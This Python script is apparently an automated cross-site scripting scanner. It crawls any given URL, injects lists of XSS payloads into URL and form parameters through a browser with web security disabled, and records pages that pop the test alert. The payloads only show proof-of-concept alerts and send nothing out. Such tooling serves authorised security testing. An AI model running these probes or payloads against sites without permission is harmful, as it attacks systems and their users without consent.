#!/usr/bin/env python3
"""
Ultimate Modern XSS Scanner - For Traditional & SPA Websites
Supports: React, Vue, Angular, SPA, Modern JS Frameworks
Author: AI Assistant
Version: 20.0 Ultimate Modern
"""

import requests
import re
import urllib.parse
import time
import json
import threading
import os
import base64
import html
import signal
import sys
import asyncio
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from bs4 import BeautifulSoup
import argparse
from colorama import init, Fore, Style
import datetime

# Try to import Playwright
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# Initialize colorama
init()

class UltimateModernXSSScanner:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        
        # Session configuration
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Data structures
        self.confirmed_vulnerabilities = []
        self.lock = threading.Lock()
        
        # Browser for validation
        self.browser = None
        self.playwright = None
        self.browser_context = None
        
        # Modern payloads for different contexts
        self.modern_payloads = {
            'html': [
                '<script>alert("XSS_CONFIRMED")</script>',
                '<img src=x onerror=alert("XSS_CONFIRMED")>',
                '<svg onload=alert("XSS_CONFIRMED")>',
                '<iframe src="javascript:alert(\'XSS_CONFIRMED\')">',
                '<body onload=alert("XSS_CONFIRMED")>',
                '<details ontoggle=alert("XSS_CONFIRMED")>',
                '<marquee onstart=alert("XSS_CONFIRMED")>',
                '<video><source onerror=alert("XSS_CONFIRMED")>'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS_CONFIRMED\')" x="',
                "' onmouseover='alert(\"XSS_CONFIRMED\")' x='",
                '" onfocus="alert(\'XSS_CONFIRMED\')" autofocus="',
                "' onfocus='alert(\"XSS_CONFIRMED\")' autofocus='",
                '" onload="alert(\'XSS_CONFIRMED\')" x="'
            ],
            'javascript': [
                ';alert("XSS_CONFIRMED");//',
                '";alert("XSS_CONFIRMED");//',
                "';alert('XSS_CONFIRMED');//",
                '}alert("XSS_CONFIRMED");//',
                ']alert("XSS_CONFIRMED");//'
            ],
            'css': [
                ';color:red;background:url("javascript:alert(\'XSS_CONFIRMED\')");',
                ';color:red;background:expression(alert("XSS_CONFIRMED"));',
                ';color:red;background:url("data:text/javascript,alert(\'XSS_CONFIRMED\')");'
            ],
            'url': [
                'javascript:alert("XSS_CONFIRMED")',
                'data:text/html,<script>alert("XSS_CONFIRMED")</script>',
                'vbscript:alert("XSS_CONFIRMED")'
            ]
        }
        
        # Create directories
        os.makedirs('screenshots', exist_ok=True)
        os.makedirs('reports', exist_ok=True)
        
        # Safe exit handling
        self.running = True
        signal.signal(signal.SIGINT, self._safe_exit)
        signal.signal(signal.SIGTERM, self._safe_exit)
    
    def _safe_exit(self, signum, frame):
        """Safe exit handler"""
        self.log("🛑 Safe exit requested...", "WARNING")
        self.running = False
        self._close_browser()
        self.log("✅ Safe exit completed", "SUCCESS")
        sys.exit(0)
    
    def log(self, message, level="INFO"):
        """Enhanced logging with better colors"""
        colors = {
            "INFO": Fore.WHITE,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.GREEN + Style.BRIGHT,
            "PHASE": Fore.CYAN + Style.BRIGHT,
            "TEST": Fore.WHITE,
            "SCORE": Fore.GREEN + Style.BRIGHT,
            "PARAM": Fore.CYAN,
            "PAYLOAD": Fore.MAGENTA,
            "ALERT": Fore.RED + Style.BRIGHT,
            "BROWSER": Fore.BLUE + Style.BRIGHT,
            "SCREENSHOT": Fore.CYAN + Style.BRIGHT,
            "SPA": Fore.YELLOW + Style.BRIGHT,
            "MODERN": Fore.MAGENTA + Style.BRIGHT
        }
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{colors.get(level, Fore.WHITE)}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
    
    def phase1_ultimate_reconnaissance(self):
        """Ultimate reconnaissance for traditional & modern websites"""
        self.log("=" * 80, "PHASE")
        self.log("PHASE 1: ULTIMATE RECONNAISSANCE (Traditional + Modern)", "PHASE")
        self.log("=" * 80, "PHASE")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            response.raise_for_status()
            self.log(f"Target accessible (Status: {response.status_code})", "SUCCESS")
            
            # Detect website type
            website_type = self._detect_website_type(response.text)
            self.log(f"Website type detected: {website_type}", "MODERN")
            
            # Parse the main page
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Traditional reconnaissance
            traditional_data = self._traditional_reconnaissance(soup)
            
            # Modern SPA reconnaissance
            modern_data = self._modern_spa_reconnaissance(response.text, soup)
            
            # Combine results
            all_data = self._combine_reconnaissance_data(traditional_data, modern_data)
            
            # Display discovered parameters
            self._display_discovered_parameters(all_data)
            
            return all_data
            
        except Exception as e:
            self.log(f"Phase 1 failed: {str(e)}", "ERROR")
            return None
    
    def _detect_website_type(self, html_content):
        """Detect if website is traditional or modern SPA"""
        # Check for modern frameworks
        if 'react' in html_content.lower() or 'vue' in html_content.lower() or 'angular' in html_content.lower():
            return "Modern SPA"
        
        # Check for SPA indicators
        spa_indicators = [
            'data-reactroot', 'ng-app', 'vue-app', 'id="app"',
            'history.pushState', 'window.location.hash',
            'fetch(', 'axios', 'XMLHttpRequest'
        ]
        
        for indicator in spa_indicators:
            if indicator in html_content:
                return "Modern SPA"
        
        return "Traditional"
    
    def _traditional_reconnaissance(self, soup):
        """Traditional website reconnaissance"""
        discovered_urls = set()
        discovered_urls.add(self.target_url)
        
        # Find all links
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href and not href.startswith('#') and not href.startswith('javascript:'):
                full_url = urljoin(self.target_url, href)
                parsed = urlparse(full_url)
                base_domain = urlparse(self.target_url).netloc
                if parsed.netloc == base_domain and not self._is_static_resource(full_url):
                    discovered_urls.add(full_url)
        
        # Extract forms
        all_forms = []
        for form in soup.find_all('form'):
            form_data = {
                'url': self.target_url,
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', ''),
                }
                form_data['inputs'].append(input_data)
            
            if form_data['action']:
                form_data['action'] = urljoin(self.target_url, form_data['action'])
            else:
                form_data['action'] = self.target_url
            
            all_forms.append(form_data)
        
        # Extract URL parameters
        all_url_params = set()
        for url in discovered_urls:
            parsed_url = urlparse(url)
            url_params = set(parse_qs(parsed_url.query).keys())
            all_url_params.update(url_params)
        
        # Extract form parameters
        all_form_params = set()
        for form in all_forms:
            for input_field in form['inputs']:
                if input_field['name']:
                    all_form_params.add(input_field['name'])
        
        return {
            'urls': list(discovered_urls),
            'forms': all_forms,
            'url_params': list(all_url_params),
            'form_params': list(all_form_params),
            'type': 'traditional'
        }
    
    def _modern_spa_reconnaissance(self, html_content, soup):
        """Modern SPA reconnaissance"""
        spa_urls = set()
        spa_forms = []
        spa_params = set()
        
        # Extract JavaScript routes and API endpoints
        js_patterns = [
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)["\']',
            r'XMLHttpRequest.*open\(["\'](?:GET|POST|PUT|DELETE)["\'],\s*["\']([^"\']+)["\']',
            r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
            r'router\.push\(["\']([^"\']+)["\']',
            r'history\.pushState\([^,]+,\s*["\']([^"\']+)["\']',
            r'href\s*=\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in js_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            for match in matches:
                if match and not match.startswith('#') and not match.startswith('javascript:'):
                    full_url = urljoin(self.target_url, match)
                    parsed = urlparse(full_url)
                    base_domain = urlparse(self.target_url).netloc
                    if parsed.netloc == base_domain and not self._is_static_resource(full_url):
                        spa_urls.add(full_url)
        
        # Extract API endpoints
        api_patterns = [
            r'/api/[^"\']+',
            r'/v\d+/[^"\']+',
            r'/graphql',
            r'/rest/[^"\']+'
        ]
        
        for pattern in api_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            for match in matches:
                full_url = urljoin(self.target_url, match)
                spa_urls.add(full_url)
        
        # Extract JavaScript variables and parameters
        js_var_patterns = [
            r'var\s+(\w+)\s*=\s*["\']([^"\']+)["\']',
            r'let\s+(\w+)\s*=\s*["\']([^"\']+)["\']',
            r'const\s+(\w+)\s*=\s*["\']([^"\']+)["\']',
            r'(\w+)\s*:\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in js_var_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            for match in matches:
                if len(match) == 2 and match[0] and match[1]:
                    spa_params.add(match[0])
        
        # Extract data attributes
        for element in soup.find_all(attrs={'data-': True}):
            for attr_name, attr_value in element.attrs.items():
                if attr_name.startswith('data-') and attr_value:
                    spa_params.add(attr_name.replace('data-', ''))
        
        return {
            'urls': list(spa_urls),
            'forms': spa_forms,
            'url_params': list(spa_params),
            'form_params': list(spa_params),
            'type': 'modern_spa'
        }
    
    def _combine_reconnaissance_data(self, traditional_data, modern_data):
        """Combine traditional and modern reconnaissance data"""
        combined_urls = set(traditional_data['urls'] + modern_data['urls'])
        combined_forms = traditional_data['forms'] + modern_data['forms']
        combined_url_params = set(traditional_data['url_params'] + modern_data['url_params'])
        combined_form_params = set(traditional_data['form_params'] + modern_data['form_params'])
        
        return {
            'urls': list(combined_urls),
            'forms': combined_forms,
            'url_params': list(combined_url_params),
            'form_params': list(combined_form_params),
            'traditional_data': traditional_data,
            'modern_data': modern_data
        }
    
    def _display_discovered_parameters(self, data):
        """Display discovered parameters"""
        self.log(f"Discovered {len(data['urls'])} URLs", "SUCCESS")
        self.log(f"Found {len(data['forms'])} forms", "SUCCESS")
        
        # Display discovered parameters
        self.log("=" * 50, "PARAM")
        self.log("DISCOVERED PARAMETERS FOR TESTING", "PARAM")
        self.log("=" * 50, "PARAM")
        
        if data['url_params']:
            self.log(f"URL Parameters ({len(data['url_params'])}):", "PARAM")
            for param in sorted(data['url_params']):
                self.log(f"  • {param}", "PARAM")
        
        if data['form_params']:
            self.log(f"Form Parameters ({len(data['form_params'])}):", "PARAM")
            for param in sorted(data['form_params']):
                self.log(f"  • {param}", "PARAM")
        
        self.log("=" * 50, "PARAM")
    
    def _is_static_resource(self, url):
        """Check if URL is static resource"""
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.pdf', '.woff', '.woff2', '.ttf', '.eot']
        return any(url.lower().endswith(ext) for ext in static_extensions)
    
    def phase2_ultimate_modern_validation(self, recon_data):
        """Ultimate modern validation with perfect screenshot"""
        self.log("=" * 80, "PHASE")
        self.log("PHASE 2: ULTIMATE MODERN VALIDATION", "PHASE")
        self.log("=" * 80, "PHASE")
        
        if not PLAYWRIGHT_AVAILABLE:
            self.log("Playwright not available, skipping browser validation", "WARNING")
            return
        
        if not self._init_browser():
            self.log("Browser initialization failed", "ERROR")
            return
        
        try:
            self.log("🌐 Browser initialized for modern validation", "BROWSER")
            self._test_all_parameters_ultimate_modern(recon_data)
        finally:
            self._close_browser()
    
    def _init_browser(self):
        """Initialize browser with modern settings"""
        try:
            self.playwright = sync_playwright().start()
            self.browser = self.playwright.chromium.launch(
                headless=False,  # Show browser for live demonstration
                args=[
                    '--no-sandbox', 
                    '--disable-setuid-sandbox',
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--disable-font-subpixel-positioning',
                    '--disable-lcd-text'
                ]
            )
            self.browser_context = self.browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            )
            return True
        except Exception as e:
            self.log(f"Browser init error: {str(e)}", "ERROR")
            return False
    
    def _close_browser(self):
        """Close browser safely"""
        try:
            if self.browser_context:
                self.browser_context.close()
            if self.browser:
                self.browser.close()
            if self.playwright:
                self.playwright.stop()
            self.log("🔒 Browser closed safely", "BROWSER")
        except Exception as e:
            self.log(f"Browser close error: {str(e)}", "ERROR")
    
    def _test_all_parameters_ultimate_modern(self, recon_data):
        """Test parameters with ultimate modern validation"""
        # Test URL parameters
        for url in recon_data['urls']:
            if not self.running:
                break
            self._test_url_parameters_ultimate_modern(url)
        
        # Test form parameters
        for form in recon_data['forms']:
            if not self.running:
                break
            self._test_form_parameters_ultimate_modern(form)
    
    def _test_url_parameters_ultimate_modern(self, url):
        """Test URL parameters with ultimate modern validation"""
        parsed_url = urlparse(url)
        url_params = parse_qs(parsed_url.query)
        
        for param_name in url_params:
            if not self.running:
                break
            self.log(f"Testing URL parameter: {param_name} on {url}", "TEST")
            
            # Test different contexts
            for context_type, payloads in self.modern_payloads.items():
                for payload in payloads:
                    if not self.running:
                        break
                    self.log(f"  Payload: {payload}", "PAYLOAD")
                    self.log(f"  Context: {context_type}", "PAYLOAD")
                    
                    success = self._validate_xss_ultimate_modern(url, None, payload, param_name, context_type)
                    if success:
                        break
    
    def _test_form_parameters_ultimate_modern(self, form):
        """Test form parameters with ultimate modern validation"""
        for input_field in form['inputs']:
            if not self.running:
                break
            if input_field['name']:
                self.log(f"Testing form parameter: {input_field['name']} on {form['action']}", "TEST")
                
                # Test different contexts
                for context_type, payloads in self.modern_payloads.items():
                    for payload in payloads:
                        if not self.running:
                            break
                        self.log(f"  Payload: {payload}", "PAYLOAD")
                        self.log(f"  Context: {context_type}", "PAYLOAD")
                        
                        form_data = {}
                        for field in form['inputs']:
                            if field['name'] == input_field['name']:
                                form_data[field['name']] = payload
                            else:
                                form_data[field['name']] = field['value']
                        
                        success = self._validate_xss_ultimate_modern(form['action'], form_data, payload, input_field['name'], context_type)
                        if success:
                            break
    
    def _take_ultimate_screenshot(self, test_page, param_name):
        """Take ultimate screenshot with multiple strategies"""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"ultimate_xss_{param_name}_{timestamp}.png"
        screenshot_path = os.path.join('screenshots', filename)
        
        # Strategy 1: Immediate screenshot without font loading
        try:
            # Disable font loading completely
            test_page.evaluate("""
                // Disable font loading
                document.fonts.ready = Promise.resolve();
                // Force immediate screenshot
                window.disableFontLoading = true;
            """)
            
            # Take screenshot immediately
            test_page.screenshot(path=screenshot_path, timeout=500)
            self.log(f"  📸 ULTIMATE SCREENSHOT CAPTURED: {screenshot_path}", "SCREENSHOT")
            return screenshot_path
        except Exception as e:
            self.log(f"  ⚠️ Strategy 1 failed: {str(e)}", "WARNING")
        
        # Strategy 2: Screenshot with minimal timeout
        try:
            test_page.screenshot(path=screenshot_path, timeout=1000)
            self.log(f"  📸 ULTIMATE SCREENSHOT CAPTURED (strategy 2): {screenshot_path}", "SCREENSHOT")
            return screenshot_path
        except Exception as e:
            self.log(f"  ⚠️ Strategy 2 failed: {str(e)}", "WARNING")
        
        # Strategy 3: Base64 screenshot
        try:
            screenshot_bytes = test_page.screenshot(timeout=500)
            with open(screenshot_path, 'wb') as f:
                f.write(screenshot_bytes)
            self.log(f"  📸 ULTIMATE SCREENSHOT CAPTURED (base64): {screenshot_path}", "SCREENSHOT")
            return screenshot_path
        except Exception as e:
            self.log(f"  ❌ All screenshot strategies failed: {str(e)}", "ERROR")
            return None
    
    def _validate_xss_ultimate_modern(self, url, form_data, payload, param_name, context_type):
        """Ultimate modern XSS validation with perfect screenshot"""
        try:
            # Create a new page for this test
            test_page = self.browser_context.new_page()
            
            # Set up dialog handler for THIS specific test
            dialog_handled = False
            alert_message = ""
            screenshot_path = None
            
            def handle_dialog(dialog):
                nonlocal dialog_handled, alert_message, screenshot_path
                try:
                    dialog_handled = True
                    alert_message = dialog.message
                    
                    self.log(f"  🚨 ALERT DETECTED: {dialog.message}", "ALERT")
                    
                    # CRITICAL: Only take screenshot if it's YOUR specific popup
                    if "XSS_CONFIRMED" in dialog.message:
                        # Take ultimate screenshot with multiple strategies
                        screenshot_path = self._take_ultimate_screenshot(test_page, param_name)
                    
                    # Accept dialog immediately
                    try:
                        dialog.accept()
                    except Exception as e:
                        self.log(f"  ⚠️ Dialog accept error: {str(e)}", "WARNING")
                        
                except Exception as e:
                    self.log(f"  ❌ Dialog handler error: {str(e)}", "ERROR")
            
            # Set up dialog handler for this test page
            test_page.on("dialog", handle_dialog)
            
            if form_data:
                # Form submission
                test_page.goto(url, wait_until="domcontentloaded", timeout=30000)
                
                # Fill form
                for field_name, field_value in form_data.items():
                    try:
                        test_page.fill(f'[name="{field_name}"]', str(field_value))
                    except:
                        continue
                
                # Submit form
                try:
                    test_page.click('input[type="submit"], button[type="submit"], button')
                except:
                    pass
                
                test_page.wait_for_load_state("domcontentloaded", timeout=30000)
            else:
                # Direct URL
                test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                test_page.goto(test_url, wait_until="domcontentloaded", timeout=30000)
            
            # Wait for XSS execution
            time.sleep(2)
            
            # Check if XSS was triggered with YOUR popup
            if dialog_handled and "XSS_CONFIRMED" in alert_message:
                # Calculate professional score
                vuln_data = {
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'context': context_type,
                    'screenshot': screenshot_path,
                    'timestamp': datetime.datetime.now().isoformat(),
                    'alert_message': alert_message,
                    'confirmed': True,
                    'popup_screenshot': screenshot_path is not None
                }
                
                with self.lock:
                    self.confirmed_vulnerabilities.append(vuln_data)
                    self.log(f"✅ CONFIRMED XSS! Parameter: {param_name}", "VULN")
                    self.log(f"Context: {context_type}", "VULN")
                    if vuln_data['screenshot']:
                        self.log(f"ULTIMATE Screenshot: {vuln_data['screenshot']}", "VULN")
                    if vuln_data['popup_screenshot']:
                        self.log(f"ULTIMATE Popup Screenshot: ✅ Captured Successfully", "SCREENSHOT")
                
                # Close test page
                test_page.close()
                return True
            
            # Close test page if no XSS found
            test_page.close()
            return False
            
        except Exception as e:
            self.log(f"Browser validation error: {str(e)}", "ERROR")
            try:
                test_page.close()
            except:
                pass
            return False
    
    def generate_ultimate_modern_report(self):
        """Generate ultimate modern HTML report"""
        self.log("Generating ultimate modern report...", "INFO")
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join('reports', f'ultimate_modern_report_{timestamp}.html')
        
        # Calculate statistics
        total_vulns = len(self.confirmed_vulnerabilities)
        popup_screenshots = len([v for v in self.confirmed_vulnerabilities if v.get('popup_screenshot', False)])
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Ultimate Modern XSS Scanner Report - {self.target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #333; }}
        .container {{ max-width: 1200px; margin: 20px auto; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; }}
        .header h1 {{ margin: 0; font-size: 2.5em; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; padding: 30px; }}
        .stat {{ background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 25px; border-radius: 10px; text-align: center; }}
        .stat-number {{ font-size: 2.5em; font-weight: bold; margin-bottom: 10px; }}
        .vulnerability {{ background: #f8f9fa; border-left: 5px solid #28a745; margin: 20px; padding: 25px; border-radius: 8px; }}
        .screenshot {{ max-width: 100%; border: 1px solid #ddd; border-radius: 8px; margin: 15px 0; }}
        .payload-display {{ background: #f8f9fa; padding: 10px; border-radius: 5px; font-family: monospace; word-break: break-all; margin: 10px 0; }}
        .alert-info {{ background: #e3f2fd; padding: 10px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #2196f3; }}
        .popup-screenshot {{ border: 3px solid #ff6b6b; box-shadow: 0 0 20px rgba(255, 107, 107, 0.3); }}
        .popup-badge {{ background: #ff6b6b; color: white; padding: 3px 8px; border-radius: 10px; font-size: 0.8em; font-weight: bold; }}
        .context-badge {{ background: #4CAF50; color: white; padding: 3px 8px; border-radius: 10px; font-size: 0.8em; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Ultimate Modern XSS Scanner Report</h1>
            <p>Target: {self.target_url}</p>
            <p>Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-number">{total_vulns}</div>
                <div>Total Vulnerabilities</div>
            </div>
            <div class="stat">
                <div class="stat-number">{popup_screenshots}</div>
                <div>Ultimate Screenshots</div>
            </div>
        </div>
        
        <div style="padding: 30px;">
            <h2>🎯 Vulnerability Details</h2>
"""
        
        if not self.confirmed_vulnerabilities:
            html_content += '<div style="text-align: center; padding: 40px; color: #28a745; font-size: 1.2em;">✅ No vulnerabilities found</div>'
        else:
            for i, vuln in enumerate(self.confirmed_vulnerabilities, 1):
                html_content += f"""
                <div class="vulnerability">
                    <h3>🔍 Vulnerability #{i} 
                        {f'<span class="popup-badge">ULTIMATE SCREENSHOT</span>' if vuln.get('popup_screenshot', False) else ''}
                        <span class="context-badge">{vuln.get('context', 'unknown').upper()}</span>
                    </h3>
                    <p><strong>URL:</strong> {vuln['url']}</p>
                    <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                    <p><strong>Payload:</strong></p>
                    <div class="payload-display">{html.escape(vuln['payload'])}</div>
                    <div class="alert-info">
                        <strong>Alert Message:</strong> {vuln.get('alert_message', 'N/A')}
                    </div>
                    <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
                    
                    {f'<img src="../{vuln["screenshot"]}" alt="ULTIMATE XSS Popup Screenshot" class="screenshot popup-screenshot">' if vuln.get('screenshot') else ''}
                </div>
"""
        
        html_content += """
        </div>
    </div>
</body>
</html>
"""
        
        try:
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.log(f"Ultimate modern report generated: {report_path}", "SUCCESS")
            return report_path
            
        except Exception as e:
            self.log(f"Error generating report: {str(e)}", "ERROR")
            return None
    
    def scan(self):
        """Main scanning method with safe exit"""
        start_time = time.time()
        
        self.log("🚀 Starting Ultimate Modern XSS Scanner v20.0", "SUCCESS")
        self.log(f"Target: {self.target_url}", "INFO")
        self.log("Press Ctrl+C for safe exit", "INFO")
        self.log("🎯 Supports Traditional & Modern SPA Websites!", "MODERN")
        self.log("📸 Ultimate screenshot strategies for perfect capture!", "SCREENSHOT")
        
        try:
            # Phase 1: Ultimate reconnaissance
            recon_data = self.phase1_ultimate_reconnaissance()
            if not recon_data or not self.running:
                return
            
            # Phase 2: Ultimate modern validation
            self.phase2_ultimate_modern_validation(recon_data)
            
            # Generate report
            if self.running:
                report_path = self.generate_ultimate_modern_report()
                
                # Show results
                self._show_final_results(report_path)
            
            elapsed_time = time.time() - start_time
            self.log(f"Scan completed in {elapsed_time:.2f} seconds", "SUCCESS")
            
        except KeyboardInterrupt:
            self.log("🛑 Scan interrupted by user", "WARNING")
        except Exception as e:
            self.log(f"Scan failed: {str(e)}", "ERROR")
        finally:
            self._close_browser()
    
    def _show_final_results(self, report_path):
        """Show final results"""
        self.log("=" * 80, "PHASE")
        self.log("SCAN RESULTS", "PHASE")
        self.log("=" * 80, "PHASE")
        
        total_vulns = len(self.confirmed_vulnerabilities)
        popup_screenshots = len([v for v in self.confirmed_vulnerabilities if v.get('popup_screenshot', False)])
        
        self.log(f"Total vulnerabilities: {total_vulns}", "SUCCESS")
        self.log(f"Ultimate screenshots: {popup_screenshots}", "SCREENSHOT")
        
        if report_path:
            self.log(f"📊 Ultimate Modern Report: {report_path}", "SUCCESS")

def main():
    parser = argparse.ArgumentParser(description='Ultimate Modern XSS Scanner v20.0')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    
    args = parser.parse_args()
    
    scanner = UltimateModernXSSScanner(args.url, args.timeout)
    scanner.scan()

if __name__ == "__main__":
    main()